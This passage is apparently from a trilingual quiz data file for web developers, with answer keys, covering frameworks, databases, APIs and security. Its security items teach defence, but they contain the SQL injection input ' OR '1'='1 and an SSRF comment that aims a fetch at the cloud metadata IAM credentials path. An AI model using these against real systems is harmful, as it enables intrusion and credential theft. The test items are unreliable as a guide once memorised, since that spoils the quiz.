    "topic": "vue",
    "options": [
      "@click",
      ":click",
      "#click",
      "(click)"
    ],
    "answer": 0,
    "run": false,
    "text": {
      "ar": {
        "prompt": "ما الاختصار الصحيح لـ v-on:click في Vue؟",
        "explanation": "@ اختصار v-on للأحداث، و: اختصار v-bind للخصائص، و# اختصار v-slot. أما (click) فصيغة Angular."
      },
      "en": {
        "prompt": "What is the shorthand for v-on:click in Vue?",
        "explanation": "@ is short for v-on (events), : is short for v-bind (attributes) and # is short for v-slot. (click) is Angular syntax."
      },
      "tr": {
        "prompt": "Vue’da v-on:click’in kısaltması nedir?",
        "explanation": "@ v-on’un (olaylar), : v-bind’ın (öznitelikler), # ise v-slot’un kısaltmasıdır. (click) Angular söz dizimidir."
      }
    }
  },
  {
    "id": "r-j-classname",
    "level": "junior",
    "topic": "react",
    "options": [
      "<div className=\"card\">",
      "<div class=\"card\">",
      "<div :class=\"card\">",
      "<div cssClass=\"card\">"
    ],
    "answer": 0,
    "run": false,
    "text": {
      "ar": {
        "prompt": "كيف تضيف CSS class لعنصر في JSX؟",
        "explanation": "class كلمة محجوزة في JavaScript، لذلك يستخدم JSX الاسم className (وhtmlFor بدل for)."
      },
      "en": {
        "prompt": "How do you add a CSS class to an element in JSX?",
        "explanation": "class is a reserved word in JavaScript, so JSX uses className (and htmlFor instead of for)."
      },
      "tr": {
        "prompt": "JSX’te bir elemana CSS class’ı nasıl eklenir?",
        "explanation": "class JavaScript’te ayrılmış bir kelimedir; JSX bu yüzden className (ve for yerine htmlFor) kullanır."
      }
    }
  },
  {
    "id": "t-j-annotation",
    "level": "junior",
    "topic": "typescript",
    "codeLang": "ts",
    "code": "let age: number = '30';",
    "answer": 0,
    "run": false,
    "text": {
      "ar": {
        "prompt": "ماذا يقول TypeScript عن هذا السطر؟",
        "explanation": "TypeScript يفحص الأنواع أثناء الكتابة والبناء، ولا يحوّل القيم. '30' نص، والمتغير معرَّف كرقم، فيظهر الخطأ قبل التشغيل.",
        "options": [
          "خطأ: النوع string لا يُسند إلى number",
          "يحوّل '30' إلى 30 تلقائيًا",
          "لا شيء، الكود صحيح",
          "خطأ فقط عند التشغيل في المتصفح"
        ]
      },
      "en": {
        "prompt": "What does TypeScript say about this line?",
        "explanation": "TypeScript checks types while you write and build; it never converts values. '30' is a string and the variable is declared as a number, so you get an error before anything runs.",
        "options": [
          "Error: type string is not assignable to type number",
          "It turns '30' into 30 for you",
          "Nothing, the code is fine",
          "An error only when it runs in the browser"
        ]
      },
      "tr": {
        "prompt": "TypeScript bu satır hakkında ne der?",
        "explanation": "TypeScript tipleri yazarken ve derlerken kontrol eder, değerleri dönüştürmez. '30' bir metin, değişken number olarak tanımlı; hata çalışmadan önce görünür.",
        "options": [
          "Hata: string tipi number tipine atanamaz",
          "'30'u otomatik olarak 30’a çevirir",
          "Hiçbir şey, kod doğru",
          "Sadece tarayıcıda çalışınca hata"
        ]
      }
    }
  },
  {
    "id": "h-m-nav",
    "level": "mid",
    "topic": "html",
    "options": [
      "<nav>",
      "<menuitem>",
      "<section>",
      "<div class=\"nav\">"
    ],
    "answer": 0,
    "run": false,
    "text": {
      "ar": {
        "prompt": "ما العنصر المناسب لقائمة الروابط الرئيسية في الموقع؟",
        "explanation": "<nav> يعلن أن هذه منطقة تنقّل، فتعرضها قارئات الشاشة كـ landmark يمكن القفز إليه. <div> لا يحمل أي معنى، و<menuitem> عنصر قديم أُزيل."
      },
      "en": {
        "prompt": "Which element fits the site’s main menu of links?",
        "explanation": "<nav> marks a navigation area, so screen readers list it as a landmark you can jump to. <div> carries no meaning, and <menuitem> is an old element that was removed."
      },
      "tr": {
        "prompt": "Sitenin ana bağlantı menüsü için hangi eleman uygundur?",
        "explanation": "<nav> bir gezinme alanını belirtir; ekran okuyucular onu atlanabilir bir landmark olarak sunar. <div> anlam taşımaz, <menuitem> ise kaldırılmış eski bir elemandır."
      }
    }
  },
  {
    "id": "h-s-details",
    "level": "senior",
    "topic": "html",
    "codeLang": "html",
    "code": "<details>\n  <summary>Is it free?</summary>\n  <p>Yes.</p>\n</details>",
    "answer": 0,
    "run": false,
    "text": {
      "ar": {
        "prompt": "ما ميزة <details> و<summary> لقسم الأسئلة الشائعة؟",
        "explanation": "المتصفح يدير الحالة (الخاصية open) والتركيز والإعلان «موسّع/مطوي» بنفسه. والنص المخفي يبقى في الـ HTML فتقرؤه محركات البحث، ويمكن البحث فيه بـ Ctrl+F في المتصفحات الحديثة.",
        "options": [
          "فتح وإغلاق مدمج يعمل بلوحة المفاتيح وقارئ الشاشة دون JavaScript",
          "يخفي النص عن محركات البحث",
          "يعمل فقط مع JavaScript",
          "تأثير بصري فقط"
        ]
      },
      "en": {
        "prompt": "What is the benefit of <details> and <summary> for an FAQ?",
        "explanation": "The browser handles the state (the open attribute), focus and the \"expanded/collapsed\" announcement. The hidden text stays in the HTML, so search engines read it, and modern browsers find it with Ctrl+F.",
        "options": [
          "Built-in open/close that works with the keyboard and screen readers, no JavaScript",
          "It hides the text from search engines",
          "It only works with JavaScript",
          "It is just a visual effect"
        ]
      },
      "tr": {
        "prompt": "SSS bölümü için <details> ve <summary> kullanmanın faydası nedir?",
        "explanation": "Tarayıcı durumu (open özniteliği), odağı ve \"genişletildi/daraltıldı\" duyurusunu kendisi yönetir. Gizli metin HTML’de kalır; arama motorları okur, modern tarayıcılarda Ctrl+F ile bulunur.",
        "options": [
          "Klavye ve ekran okuyucuyla çalışan yerleşik aç/kapa; JavaScript gerekmez",
          "Metni arama motorlarından gizler",
          "Sadece JavaScript ile çalışır",
          "Sadece görsel bir efekt"
        ]
      }
    }
  },
  {
    "id": "as-j-timeout-zero",
    "level": "junior",
    "topic": "async",
    "codeLang": "js",
    "code": "console.log('A');\nsetTimeout(() => console.log('B'), 0);\nconsole.log('C');",
    "options": [
      "A, C, B",
      "A, B, C",
      "B, A, C",
      "C, A, B"
    ],
    "answer": 0,
    "text": {
      "ar": {
        "prompt": "ما ترتيب الطباعة؟",
        "explanation": "setTimeout بمدة 0 لا ينفّذ فورًا، بل يضع الدالة في الطابور لتعمل بعد انتهاء الكود الحالي. لذلك يُطبع A ثم C، ثم B."
      },
      "en": {
        "prompt": "In what order are things logged?",
        "explanation": "setTimeout with 0 does not run right away. It queues the callback to run after the current code finishes, so A, then C, then B."
      },
      "tr": {
        "prompt": "Konsola hangi sırayla yazılır?",
        "explanation": "0 süreli setTimeout hemen çalışmaz; callback’i mevcut kod bittikten sonra çalışmak üzere sıraya koyar. Önce A, sonra C, en son B."
      }
    }
  },
  {
    "id": "p-j-image-size",
    "level": "junior",
    "topic": "performance",
    "answer": 0,
    "run": false,
    "text": {
      "ar": {
        "prompt": "صورة بعرض 4000px وحجم 5MB تُعرض في مربع عرضه 400px. ما أفضل تحسين؟",
        "explanation": "CSS يصغّر العرض فقط، لكن المتصفح يحمّل 5MB كاملة. صورة 800px (لشاشات الكثافة العالية) بصيغة WebP قد تكون أقل من 100KB.",
        "options": [
          "تصغيرها وضغطها بصيغة حديثة مثل WebP أو AVIF",
          "تصغيرها بـ CSS فقط",
          "وضعها كخلفية",
          "لا مشكلة"
        ]
      },
      "en": {
        "prompt": "A 4000px, 5 MB photo is shown in a 400px box. What is the best fix?",
        "explanation": "CSS only shrinks how it looks; the browser still downloads all 5 MB. An 800px WebP (for high-density screens) can be under 100 KB.",
        "options": [
          "Resize it and compress it to a modern format like WebP or AVIF",
          "Only shrink it with CSS",
          "Use it as a background image",
          "There is no problem"
        ]
      },
      "tr": {
        "prompt": "4000px genişliğinde, 5 MB’lık bir fotoğraf 400px’lik bir kutuda gösteriliyor. En iyi iyileştirme nedir?",
        "explanation": "CSS sadece görünümü küçültür, tarayıcı yine 5 MB indirir. 800px’lik bir WebP (yüksek yoğunluklu ekranlar için) 100 KB’ın altında olabilir.",
        "options": [
          "Boyutunu küçültüp WebP veya AVIF gibi modern bir biçimde sıkıştırmak",
          "Sadece CSS ile küçültmek",
          "Arka plan görseli yapmak",
          "Sorun yok"
        ]
      }
    }
  },
  {
    "id": "p-m-debounce-search",
    "level": "mid",
    "topic": "performance",
    "answer": 0,
    "run": false,
    "text": {
      "ar": {
        "prompt": "حقل بحث يرسل طلبًا إلى الخادم مع كل حرف. ما الحل الأنسب؟",
        "explanation": "debounce يؤجل التنفيذ حتى يتوقف المستخدم عن الكتابة، فتصبح كلمة «react» طلبًا واحدًا بدل خمسة. وthrottle يحدد عدد المرات في الثانية، وهو أنسب للتمرير وتغيير الحجم.",
        "options": [
          "debounce: انتظر توقف الكتابة نحو 300ms ثم أرسل",
          "throttle على حدث scroll",
          "إرسال الطلب كل 5 ثوانٍ مهما حدث",
          "تعطيل الحقل أثناء الطلب"
        ]
      },
      "en": {
        "prompt": "A search box sends a server request on every keystroke. What is the best fix?",
        "explanation": "Debounce waits until the user stops typing, so \"react\" becomes one request instead of five. Throttle limits how often something runs per second, which suits scroll and resize.",
        "options": [
          "Debounce: wait until typing pauses for ~300 ms, then send",
          "Throttle the scroll event",
          "Send a request every 5 seconds no matter what",
          "Disable the input during the request"
        ]
      },
      "tr": {
        "prompt": "Bir arama kutusu her tuşta sunucuya istek gönderiyor. En uygun çözüm nedir?",
        "explanation": "Debounce kullanıcı yazmayı bırakana kadar bekler; \"react\" beş yerine tek istek olur. Throttle saniyedeki çalışma sayısını sınırlar; scroll ve resize için daha uygundur.",
        "options": [
          "Debounce: yazma ~300 ms durunca gönder",
          "scroll olayını throttle etmek",
          "Ne olursa olsun her 5 saniyede istek göndermek",
          "İstek sırasında input’u devre dışı bırakmak"
        ]
      }
    }
  },
  {
    "id": "sec-j-api-key",
    "level": "junior",
    "topic": "security",
    "codeLang": "jsx",
    "code": "const OPENAI_KEY = 'sk-live-…';\nfetch(url, { headers: { Authorization: `Bearer ${OPENAI_KEY}` } });",
    "answer": 0,
    "run": false,
    "text": {
      "ar": {
        "prompt": "وضعت مفتاح API سريًا لخدمة مدفوعة داخل كود React. ما المشكلة؟",
        "explanation": "كل ما يصل إلى المتصفح يمكن قراءته. ضع المفتاح في الخادم (أو serverless function)، والمتصفح يطلب من خادمك، وخادمك يتصل بالخدمة.",
        "options": [
          "أي زائر يستطيع رؤيته في ملفات الموقع أو تبويب Network واستخدامه على حسابك",
          "لا مشكلة إذا كان المستودع خاصًا",
          "لا مشكلة لأن الكود مضغوط (minified)",
          "فقط إذا كان الموقع على http"
        ]
      },
      "en": {
        "prompt": "You put a secret API key for a paid service in your React code. What is the problem?",
        "explanation": "Everything sent to the browser can be read. Keep the key on a server (or a serverless function): the browser calls your server, and your server calls the service.",
        "options": [
          "Any visitor can see it in the site files or the Network tab and use it on your account",
          "Fine if the repo is private",
          "Fine because the code is minified",
          "Only a problem on http"
        ]
      },
      "tr": {
        "prompt": "Ücretli bir servisin gizli API anahtarını React koduna koydun. Sorun nedir?",
        "explanation": "Tarayıcıya giden her şey okunabilir. Anahtarı sunucuda (veya serverless fonksiyonda) tut: tarayıcı senin sunucunu çağırır, sunucun servisi çağırır.",
        "options": [
          "Her ziyaretçi onu site dosyalarında veya Network sekmesinde görüp senin hesabınla kullanabilir",
          "Depo özelse sorun yok",
          "Kod minify edildiği için sorun yok",
          "Sadece http’de sorun"
        ]
      }
    }
  },
  {
    "id": "sec-m-csrf",
    "level": "mid",
    "topic": "security",
    "options": [
      "CSRF",
      "XSS",
      "SQL Injection",
      "Clickjacking"
    ],
    "answer": 0,
    "run": false,
    "text": {
      "ar": {
        "prompt": "موقع خبيث يحتوي نموذجًا مخفيًا يُرسل إلى bank.com/transfer، والمستخدم مسجّل الدخول في البنك. ما اسم هذا الهجوم؟",
        "explanation": "CSRF (تزوير الطلب عبر المواقع): المتصفح يرسل cookies البنك مع الطلب تلقائيًا، فيبدو كأنه من المستخدم. الحماية: cookies بـ SameSite=Lax أو Strict، ورمز CSRF في النماذج."
      },
      "en": {
        "prompt": "A malicious site has a hidden form that posts to bank.com/transfer while the user is signed in to the bank. What is this attack called?",
        "explanation": "CSRF (cross-site request forgery): the browser attaches the bank’s cookies automatically, so the request looks like it came from the user. Defences: SameSite=Lax or Strict cookies and a CSRF token in forms."
      },
      "tr": {
        "prompt": "Kötü niyetli bir sitede bank.com/transfer’e gönderen gizli bir form var ve kullanıcı bankaya giriş yapmış. Bu saldırının adı nedir?",
        "explanation": "CSRF (siteler arası istek sahteciliği): tarayıcı bankanın cookie’lerini otomatik ekler, istek kullanıcıdan gelmiş gibi görünür. Korunma: SameSite=Lax veya Strict cookie’ler ve formlarda CSRF token."
      }
    }
  },
  {
    "id": "db-j-where",
    "level": "junior",
    "topic": "databases",
    "codeLang": "sql",
    "code": "SELECT name FROM users WHERE age > 18;",
    "options": [
      "WHERE",
      "ORDER BY",
      "GROUP BY",
      "FROM"
    ],
    "answer": 0,
    "run": false,
    "text": {
      "ar": {
        "prompt": "أي جزء في الاستعلام يحدد الصفوف التي تُرجع؟",
        "explanation": "WHERE يفلتر الصفوف قبل إرجاعها. FROM يحدد الجدول، وORDER BY يرتب، وGROUP BY يجمع الصفوف في مجموعات."
      },
      "en": {
        "prompt": "Which clause decides which rows come back?",
        "explanation": "WHERE filters rows before they are returned. FROM picks the table, ORDER BY sorts and GROUP BY groups rows."
      },
      "tr": {
        "prompt": "Sorguda hangi satırların döneceğini hangi kısım belirler?",
        "explanation": "WHERE satırları döndürmeden önce süzer. FROM tabloyu seçer, ORDER BY sıralar, GROUP BY gruplar."
      }
    }
  },
  {
    "id": "db-m-index-cost",
    "level": "mid",
    "topic": "databases",
    "codeLang": "sql",
    "code": "CREATE INDEX idx_users_email ON users(email);",
    "answer": 0,
    "run": false,
    "text": {
      "ar": {
        "prompt": "أضفت فهرسًا على عمود email. ما الثمن الذي تدفعه مقابل سرعة البحث؟",
        "explanation": "كل كتابة تحدّث الجدول والفهرس معًا، والفهرس يأخذ مساحة. لذلك نضع الفهارس على الأعمدة المستخدمة فعلًا في البحث والربط والترتيب.",
        "options": [
          "كتابة أبطأ قليلًا (INSERT/UPDATE) ومساحة تخزين إضافية",
          "لا شيء",
          "قراءات أبطأ",
          "لا يمكن تعديل email بعدها"
        ]
      },
      "en": {
        "prompt": "You add an index on email. What do you pay for the faster lookups?",
        "explanation": "Every write updates both the table and the index, and the index takes space. So index the columns you really filter, join or sort on.",
        "options": [
          "Slightly slower writes (INSERT/UPDATE) and extra storage",
          "Nothing",
          "Slower reads",
          "email can no longer be changed"
        ]
      },
      "tr": {
        "prompt": "email’e indeks ekledin. Hızlı arama için ne ödersin?",
        "explanation": "Her yazma hem tabloyu hem indeksi günceller ve indeks yer kaplar. Bu yüzden gerçekten filtrelediğin, birleştirdiğin veya sıraladığın sütunları indeksle.",
        "options": [
          "Biraz daha yavaş yazma (INSERT/UPDATE) ve ek depolama",
          "Hiçbir şey",
          "Daha yavaş okuma",
          "email artık değiştirilemez"
        ]
      }
    }
  },
  {
    "id": "db-s-oversell",
    "level": "senior",
    "topic": "databases",
    "codeLang": "js",
    "code": "const { stock } = await db.one('SELECT stock FROM items WHERE id = ?', [id]);\nif (stock > 0) {\n  await db.run('UPDATE items SET stock = ? WHERE id = ?', [stock - 1, id]);\n  await createOrder(id);\n}",
    "answer": 0,
    "run": false,
    "text": {
      "ar": {
        "prompt": "بقيت قطعة واحدة في المخزون، وطلبان وصلا في نفس اللحظة. ماذا قد يحدث، وما الحل؟",
        "explanation": "هذا race condition: الطلبان يقرآن 1 قبل أن يكتب أي منهما. الشرط داخل UPDATE يجعل الفحص والتعديل خطوة واحدة. أو استخدم SELECT … FOR UPDATE داخل transaction.",
        "options": [
          "يُباع المنتج مرتين. الحل تحديث ذري: UPDATE … SET stock = stock - 1 WHERE id = ? AND stock > 0 وفحص عدد الصفوف المتأثرة",
          "لا يحدث شيء لأن قاعدة البيانات ترتب الطلبات",
          "يفشل الطلبان",
          "الحل إضافة فهرس على stock"
        ]
      },
      "en": {
        "prompt": "One item is left in stock and two requests arrive at the same moment. What can happen, and what is the fix?",
        "explanation": "This is a race condition: both read 1 before either writes. Putting the check inside the UPDATE makes check and change one step. Or use SELECT … FOR UPDATE inside a transaction.",
        "options": [
          "It sells twice. Use an atomic update: UPDATE … SET stock = stock - 1 WHERE id = ? AND stock > 0 and check the affected row count",
          "Nothing, the database orders requests",
          "Both requests fail",
          "Add an index on stock"
        ]
      },
      "tr": {
        "prompt": "Stokta tek ürün kaldı ve aynı anda iki istek geldi. Ne olabilir, çözüm ne?",
        "explanation": "Bu bir yarış durumu: ikisi de yazmadan önce 1 okur. Koşulu UPDATE içine koymak kontrolü ve değişikliği tek adım yapar. Ya da transaction içinde SELECT … FOR UPDATE kullan.",
        "options": [
          "İki kez satılır. Atomik güncelleme kullan: UPDATE … SET stock = stock - 1 WHERE id = ? AND stock > 0 ve etkilenen satır sayısını kontrol et",
          "Hiçbir şey, veritabanı istekleri sıraya koyar",
          "İki istek de başarısız olur",
          "stock’a indeks ekle"
        ]
      }
    }
  },
  {
    "id": "api-j-get-post",
    "level": "junior",
    "topic": "api",
    "options": [
      "POST /users",
      "GET /users/create",
      "GET /users?new=1",
      "DELETE /users"
    ],
    "answer": 0,
    "run": false,
    "text": {
      "ar": {
        "prompt": "أي طريقة HTTP مناسبة لإنشاء مستخدم جديد؟",
        "explanation": "GET للقراءة فقط ولا يغيّر البيانات، وقد يُخزَّن في الكاش أو يُعاد إرساله. الإنشاء يكون بـ POST على مجموعة المستخدمين."
      },
      "en": {
        "prompt": "Which HTTP method fits creating a new user?",
        "explanation": "GET is for reading only and must not change data; it can be cached or retried. Creating is a POST to the users collection."
      },
      "tr": {
        "prompt": "Yeni kullanıcı oluşturmak için hangi HTTP metodu uygundur?",
        "explanation": "GET sadece okumak içindir, veri değiştirmemeli; önbelleğe alınabilir veya tekrar gönderilebilir. Oluşturma, kullanıcı koleksiyonuna POST ile yapılır."
      }
    }
  },
  {
    "id": "api-m-idempotent",
    "level": "mid",
    "topic": "api",
    "options": [
      "POST",
      "PUT",
      "DELETE",
      "GET"
    ],
    "answer": 0,
    "run": false,
    "text": {
      "ar": {
        "prompt": "أي طريقة HTTP ليست idempotent، أي أن تكرارها قد يغيّر النتيجة؟",
        "explanation": "إرسال PUT بنفس البيانات مرتين يترك نفس الحالة، وDELETE مرتين يبقى المورد محذوفًا. أما POST مرتين فقد ينشئ طلبين. لهذا تعيد المكتبات المحاولة تلقائيًا للطرق idempotent فقط."
      },
      "en": {
        "prompt": "Which HTTP method is not idempotent, so repeating it can change the result?",
        "explanation": "Sending the same PUT twice leaves the same state, and deleting twice leaves it deleted. Two POSTs can create two orders. That is why clients only auto-retry idempotent methods."
      },
      "tr": {
        "prompt": "Hangi HTTP metodu idempotent değildir, yani tekrarı sonucu değiştirebilir?",
        "explanation": "Aynı PUT’u iki kez göndermek aynı durumu bırakır, iki kez DELETE de silinmiş bırakır. İki POST iki sipariş oluşturabilir. Bu yüzden istemciler sadece idempotent metotları otomatik tekrar eder."
      }
    }
  },
  {
    "id": "api-s-idempotency-key",
    "level": "senior",
    "topic": "api",
    "codeLang": "http",
    "code": "POST /payments\nIdempotency-Key: 7f3c9a2e-…",
    "answer": 0,
    "run": false,
    "text": {
      "ar": {
        "prompt": "طلب دفع POST انتهت مهلته عند العميل، فأعاد الإرسال. كيف تمنع خصم المبلغ مرتين؟",
        "explanation": "العميل لا يعرف إن كان الطلب الأول نجح قبل انقطاع الاتصال. المفتاح يجعل POST آمنًا للتكرار، وهي الطريقة التي تستخدمها Stripe مثلًا.",
        "options": [
          "مفتاح Idempotency-Key فريد لكل عملية، والخادم يحفظ نتيجته ويرجعها عند التكرار",
          "منع العميل من إعادة المحاولة",
          "تحويل الطلب إلى GET",
          "زيادة مهلة الطلب فقط"
        ]
      },
      "en": {
        "prompt": "A payment POST timed out on the client, so it resent it. How do you stop a double charge?",
        "explanation": "The client cannot know whether the first request succeeded before the connection dropped. The key makes the POST safe to repeat, which is how Stripe does it, for example.",
        "options": [
          "A unique Idempotency-Key per operation; the server stores the result and returns it on repeats",
          "Forbid clients from retrying",
          "Turn it into a GET",
          "Only raise the timeout"
        ]
      },
      "tr": {
        "prompt": "Bir ödeme POST’u istemcide zaman aşımına uğradı ve tekrar gönderildi. Çift tahsilatı nasıl önlersin?",
        "explanation": "İstemci, bağlantı kopmadan önce ilk isteğin başarılı olup olmadığını bilemez. Anahtar POST’u tekrar için güvenli yapar; Stripe da böyle yapar.",
        "options": [
          "Her işlem için benzersiz Idempotency-Key; sunucu sonucu saklar ve tekrarda aynısını döndürür",
          "İstemcinin tekrar denemesini yasaklamak",
          "GET’e çevirmek",
          "Sadece zaman aşımını artırmak"
        ]
      }
    }
  },
  {
    "id": "ar-j-cache",
    "level": "junior",
    "topic": "architecture",
    "answer": 0,
    "run": false,
    "text": {
      "ar": {
        "prompt": "ما فكرة التخزين المؤقت (caching) في الخادم؟",
        "explanation": "مثلًا نتيجة استعلام ثقيل تُحفظ في Redis لدقائق، فتُخدم الطلبات التالية من الذاكرة بسرعة. والتحدي هو تحديثها عندما تتغير البيانات.",
        "options": [
          "حفظ نتيجة عملية مكلفة لإعادة استخدامها بدل حسابها كل مرة",
          "نسخ قاعدة البيانات احتياطيًا",
          "ضغط الملفات قبل إرسالها",
          "تشفير البيانات"
        ]
      },
      "en": {
        "prompt": "What is the idea of caching on the server?",
        "explanation": "For example, a heavy query result is kept in Redis for a few minutes, so the next requests are served from memory. The hard part is refreshing it when the data changes.",
        "options": [
          "Keeping the result of an expensive operation to reuse instead of recomputing it",
          "Backing up the database",
          "Compressing files before sending",
          "Encrypting data"
        ]
      },
      "tr": {
        "prompt": "Sunucuda önbelleklemenin (caching) fikri nedir?",
        "explanation": "Örneğin ağır bir sorgu sonucu birkaç dakika Redis’te tutulur ve sonraki istekler bellekten hızla karşılanır. Zor kısım, veri değişince onu yenilemektir.",
        "options": [
          "Pahalı bir işlemin sonucunu her seferinde hesaplamak yerine saklayıp yeniden kullanmak",
          "Veritabanını yedeklemek",
          "Dosyaları göndermeden önce sıkıştırmak",
          "Veriyi şifrelemek"
        ]
      }
    }
  },
  {
    "id": "ar-m-sessions-memory",
    "level": "mid",
    "topic": "architecture",
    "answer": 0,
    "run": false,
    "text": {
      "ar": {
        "prompt": "شغّلت خادمين خلف load balancer، والجلسات محفوظة في ذاكرة كل خادم. ماذا يلاحظ المستخدمون؟",
        "explanation": "الطلب التالي قد يذهب للخادم الآخر الذي لا يعرف الجلسة. اجعل الخوادم «بلا حالة» (stateless) وضع الحالة في مخزن مشترك، فتستطيع إضافة خوادم بحرية.",
        "options": [
          "يخرجون من حساباتهم فجأة؛ الحل تخزين الجلسات في Redis أو قاعدة البيانات، أو رموز موقّعة",
          "لا شيء",
          "الموقع يصبح أسرع",
          "تتكرر طلباتهم"
        ]
      },
      "en": {
        "prompt": "You run two servers behind a load balancer, with sessions stored in each server’s memory. What do users notice?",
        "explanation": "The next request may hit the other server, which does not know the session. Keep servers stateless and put state in a shared store, so you can add servers freely.",
        "options": [
          "They get logged out at random; store sessions in Redis or the database, or use signed tokens",
          "Nothing",
          "The site gets faster",
          "Their requests repeat"
        ]
      },
      "tr": {
        "prompt": "Load balancer arkasında iki sunucu çalıştırıyorsun ve oturumlar her sunucunun belleğinde. Kullanıcılar ne fark eder?",
        "explanation": "Sonraki istek oturumu bilmeyen diğer sunucuya gidebilir. Sunucuları durumsuz (stateless) tut, durumu ortak bir depoda sakla; böylece rahatça sunucu ekleyebilirsin.",
        "options": [
          "Rastgele oturumdan düşerler; oturumları Redis’te veya veritabanında tut ya da imzalı token kullan",
          "Hiçbir şey",
          "Site hızlanır",
          "İstekleri tekrarlanır"
        ]
      }
    }
  },
  {
    "id": "ar-s-stampede",
    "level": "senior",
    "topic": "architecture",
    "answer": 0,
    "run": false,
    "text": {
      "ar": {
        "prompt": "مفتاح كاش لصفحة شهيرة انتهت صلاحيته، فوصل 2000 طلب إلى قاعدة البيانات في نفس الثانية. ما اسم المشكلة وكيف تُحل؟",
        "explanation": "كل الطلبات ترى الكاش فارغًا وتذهب لقاعدة البيانات معًا. «طلب واحد يبني والباقي ينتظر أو يأخذ القديم» (single-flight / stale-while-revalidate) يحمي القاعدة، والعشوائية تمنع انتهاء مفاتيح كثيرة معًا.",
        "options": [
          "cache stampede: قفل حتى يعيد طلب واحد البناء، أو تقديم النسخة القديمة أثناء التحديث، مع TTL عشوائي",
          "deadlock: أعد تشغيل قاعدة البيانات",
          "N+1: أضف JOIN",
          "لا حل إلا خادم أكبر"
        ]
      },
      "en": {
        "prompt": "The cache key for a popular page expires and 2,000 requests hit the database in the same second. What is this and how do you fix it?",
        "explanation": "Every request sees an empty cache and goes to the database at once. \"One request rebuilds, the rest wait or get the stale copy\" (single-flight / stale-while-revalidate) protects the database, and jitter stops many keys expiring together.",
        "options": [
          "A cache stampede: a lock so one request rebuilds, or serve the stale copy while refreshing, plus jittered TTLs",
          "A deadlock: restart the database",
          "N+1: add a JOIN",
          "Only a bigger server helps"
        ]
      },
      "tr": {
        "prompt": "Popüler bir sayfanın önbellek anahtarı sona erdi ve aynı saniyede 2.000 istek veritabanına gitti. Bu nedir ve nasıl çözülür?",
        "explanation": "Her istek önbelleği boş görür ve aynı anda veritabanına gider. \"Bir istek yeniden oluşturur, diğerleri bekler ya da eskiyi alır\" (single-flight / stale-while-revalidate) veritabanını korur; rastgelelik çok sayıda anahtarın birlikte bitmesini önler.",
        "options": [
          "Cache stampede: tek bir istek yeniden oluşturana kadar kilit ya da yenilerken eski kopyayı sunmak, ayrıca rastgele TTL",
          "Deadlock: veritabanını yeniden başlat",
          "N+1: JOIN ekle",
          "Tek çare daha büyük sunucu"
        ]
      }
    }
  },
  {
    "id": "ss-j-sql-injection",
    "level": "junior",
    "topic": "server-security",
    "codeLang": "js",
    "code": "const sql = \"SELECT * FROM users WHERE email = '\" + req.query.email + \"'\";\ndb.query(sql);",
    "answer": 0,
    "run": false,
    "text": {
      "ar": {
        "prompt": "ما الخطر في هذا الكود؟",
        "explanation": "عند دمج النص داخل الاستعلام يصبح إدخال المستخدم جزءًا من الكود. مع db.query('… WHERE email = ?', [email]) تُرسل القيمة منفصلة ولا تُفسَّر كـ SQL أبدًا.",
        "options": [
          "SQL injection: إدخال مثل ' OR '1'='1 يغيّر الاستعلام. استخدم الاستعلامات ذات المعاملات (?)",
          "الاستعلام بطيء فقط",
          "لا خطر لأن البريد نص",
          "يجب استخدام double quotes"
        ]
      },
      "en": {
        "prompt": "What is the danger in this code?",
        "explanation": "Gluing text into the query turns user input into code. With db.query('… WHERE email = ?', [email]) the value is sent separately and is never read as SQL.",
        "options": [
          "SQL injection: input like ' OR '1'='1 changes the query. Use parameterised queries (?)",
          "It is only slow",
          "No danger, email is just text",
          "You must use double quotes"
        ]
      },
      "tr": {
        "prompt": "Bu koddaki tehlike nedir?",
        "explanation": "Metni sorguya yapıştırmak kullanıcı girdisini koda çevirir. db.query('… WHERE email = ?', [email]) ile değer ayrı gönderilir ve asla SQL olarak okunmaz.",
        "options": [
          "SQL injection: ' OR '1'='1 gibi bir girdi sorguyu değiştirir. Parametreli sorgu (?) kullan",
          "Sadece yavaştır",
          "Tehlike yok, e-posta sadece metin",
          "Çift tırnak kullanılmalı"
        ]
      }
    }
  },
  {
    "id": "ss-m-idor",
    "level": "mid",
    "topic": "server-security",
    "codeLang": "js",
    "code": "app.get('/invoices/:id', auth, async (req, res) => {\n  res.json(await Invoice.findById(req.params.id));\n});",
    "answer": 0,
    "run": false,
    "text": {
      "ar": {
        "prompt": "مستخدم غيّر الرقم في الرابط فرأى فاتورة شخص آخر. ما اسم الثغرة وكيف تُصلح؟",
        "explanation": "auth يثبت هوية المستخدم فقط، ولا يفحص ملكية المورد. اجعل الاستعلام نفسه يقيّد بالمالك: findOne({ id, userId: req.user.id }). والمعرّفات العشوائية تساعد لكنها لا تكفي وحدها.",
        "options": [
          "IDOR: تحقق أن الفاتورة تخص req.user قبل إرجاعها",
          "XSS: شفّر الرد",
          "CSRF: أضف رمزًا للنموذج",
          "لا ثغرة، المستخدم مسجّل الدخول"
        ]
      },
      "en": {
        "prompt": "A user changed the number in the URL and saw someone else’s invoice. What is the hole and the fix?",
        "explanation": "auth only proves who the user is; it does not check ownership. Scope the query itself: findOne({ id, userId: req.user.id }). Random ids help but are not enough on their own.",
        "options": [
          "IDOR: check the invoice belongs to req.user before returning it",
          "XSS: escape the response",
          "CSRF: add a form token",
          "No hole, the user is signed in"
        ]
      },
      "tr": {
        "prompt": "Bir kullanıcı URL’deki numarayı değiştirip başkasının faturasını gördü. Açık nedir, nasıl düzeltilir?",
        "explanation": "auth sadece kullanıcının kim olduğunu kanıtlar, sahipliği kontrol etmez. Sorgunun kendisini sahibe göre sınırla: findOne({ id, userId: req.user.id }). Rastgele kimlikler yardımcı olur ama tek başına yetmez.",
        "options": [
          "IDOR: döndürmeden önce faturanın req.user’a ait olduğunu kontrol et",
          "XSS: yanıtı kaçışla",
          "CSRF: forma token ekle",
          "Açık yok, kullanıcı giriş yapmış"
        ]
      }
    }
  },
  {
    "id": "ss-s-ssrf",
    "level": "senior",
    "topic": "server-security",
    "codeLang": "js",
    "code": "const html = await fetch(req.body.url).then(r => r.text());\n// url = \"http://169.254.169.254/latest/meta-data/iam/…\"",
    "answer": 0,
    "run": false,
    "text": {
      "ar": {
        "prompt": "ميزة «معاينة رابط» تجعل الخادم يجلب أي URL يكتبه المستخدم. ما الخطر الأكبر؟",
        "explanation": "خادمك داخل الشبكة الخاصة، فيستطيع الوصول إلى ما لا يصله المهاجم، مثل خدمة الـ metadata في السحابة. افحص عنوان IP بعد تحليل DNS، واحذر من إعادة التوجيه إلى عنوان داخلي.",
        "options": [
